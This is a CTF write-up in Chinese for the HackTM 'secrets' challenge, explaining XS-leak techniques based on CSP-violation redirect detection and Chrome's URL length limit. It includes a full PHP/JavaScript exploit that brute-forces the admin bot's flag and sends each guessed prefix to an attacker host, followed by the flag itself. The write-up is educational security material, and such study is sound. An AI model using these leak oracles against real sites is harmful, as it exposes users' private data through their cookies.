# secrets

比赛后未找到题目文件，环境还开着但是也没啥用了，很快就会作废。记录[wp](https://www.xanhacks.xyz/p/secrets-hacktmctf/)。

此题为[XS-leak](https://xsleaks.dev/)的其中一个技巧：[Cross-Origin Redirects and CSP Violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects)。原题的环境是一个笔记记录网站，同时有个bot扮演admin的身份。注册登录后可以写笔记以及根据笔记内容查找自己的笔记。此题的第一个考点：要干啥？有bot，肯定是xss这类题型，接下来就是根据题目的细节判断是什么考点了。查看cookie的属性，发现设置得很不安全：

- SameSite: None: The cookie will be attached from a request send from every site.
- Secure: false: The cookie can be used by an HTTP server (no HTTPS requirement).

关于考点，更明显的特征是查询成功与失败的url重定向结果。如果我们查询的内容（query）出现在我们写过的笔记里，url为`http://results.wtl.pw/results?ids=<note_uuid>&query=<query>`；如果没有，url为`http://secrets.wtl.pw/#<query>`。此时可以猜测我们需要获得admin bot笔记里的内容。

所谓“Cross-Origin Redirects and CSP Violations”其实不难理解。如果我们在html文件的开头加上这么一句：

```html
<meta http-equiv="Content-Security-Policy" content="form-action http://secrets.wtl.pw">
```

这个文件中的form只能提交至`http://secrets.wtl.pw`及其子页面（如`http://secrets.wtl.pw/search`)，其他的就不行，会触发js里的一个事件：“securitypolicyviolation”。看下面一个例子：

```html
<!-- Set the Content-Security-Policy to only allow secrets.wtl.pw -->
<meta http-equiv="Content-Security-Policy" content="form-action http://secrets.wtl.pw">
<form action="http://secrets.wtl.pw/search" method="GET">
    <input type="text" name="query" value="HackTM{">
</form>

<script>
// Listen for a CSP violation event
document.addEventListener('securitypolicyviolation', () => {
    // Valid search query will be catch here
    console.log("Detected a redirect to somewhere other than secrets.wtl.pw");
});
// Try to get secrets.wtl.pw via a form. If it redirects to another cross-site website
// it will trigger a CSP violation event
document.forms[0].submit();
</script>
```

如果我们查询的值“HackTM{”能查出来结果，url就会被重定向至`http://results.wtl.pw/results?ids=<note_uuid>&query=<query>`，不是`http://secrets.wtl.pw`，便会触发事件；反之若没查出来结果，网页正常重定向至`http://secrets.wtl.pw/#<query>`，无事件触发。注意只适用于基于Chromium的浏览器，FireFox就不行。

那情况就很明朗了。我们在自己的服务器部署一个不停发送query的文件，然后把服务器的url发给bot。bot访问后就会不断进行query，因为cookie的不安全设置，query时带的是bot的cookie，就能查询flag相关值了。这里给出wp作者的脚本。

```php
<?php
$test = isset($_GET['test']) ? $_GET['test'] : '';
$flag = isset($_GET['flag']) ? $_GET['flag'] : '';

if (!substr($flag, 0, strlen($flag)) === substr("HackTM{", 0, strlen($flag))) {
    die();
}
if (!substr($test, 0, strlen($test)) === substr("HackTM{", 0, strlen($test))) {
    die();
}
?>

<?php if ($flag !== ''): ?>
<script>
let charset = "abcdefghijklmnopqrstuvwxyzHTM0123456789{}_";
for (let i = 0; i < charset.length; i++) {
    window.open("http://xpl.xanhacks.xyz/?test=" + "<?= $flag ?>" + charset[i]);
}
</script>
<?php endif; ?>
<?php if ($flag !== '') { die(); } ?>

<meta http-equiv="Content-Security-Policy" content="form-action http://secrets.wtl.pw">
<form action="http://secrets.wtl.pw/search" method="get">
    <input type="text" name="query" value="<?= $test ?>">
</form>

<script>
    document.addEventListener('securitypolicyviolation', () => {
        window.location.href="http://xpl.xanhacks.xyz/?flag=<?= $test ?>";
    });
    document.forms[0].submit();
</script>
```

另一个[wp](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets)则介绍了非预期解，利用了Chrome url只能有2mb大小的限制。如果我们强行访问`/search?query=<query>#AAA...[2MB]...AAA`，结果页面为`about:blank#blocked`。所以这有什么用？看下面的例子：

```js
//此时我们在wp界面的开发者工具的console中输入：
w=window.open("http://secrets.wtl.pw")
w.origin;//会报错
```

我们构造一个特别的url：

```js
let url = "http://secrets.wtl.pw/search?query=test#"
let w = window.open(url + "A".repeat(2 * 1024 * 1024 - url.length - 1))//这里正好2MB-1，暂时无事发生
```

这个url查询成功后会重定向至`http://results.wtl.pw/results?ids=<note UUIDs>&query=test#AAA...AAA`。问题来了，这url一加上个ids不就超过限制了吗？于是我们被重定向至`about:blank`页面。这个页面特殊的地方在于，它的origin属性是parent的，不会报错。

这时思路就出来了。我们不断构造向上面那样的payload，将带有payload的url发给bot。bot执行query，如果猜测的flag字符对了，访问origin属性不会报错；如果猜测的flag字符错了，访问origin会报错。根据此就能爆破flag了。

## Flag
> HackTM{pwnd_by_xsleaks_2d11eb9b}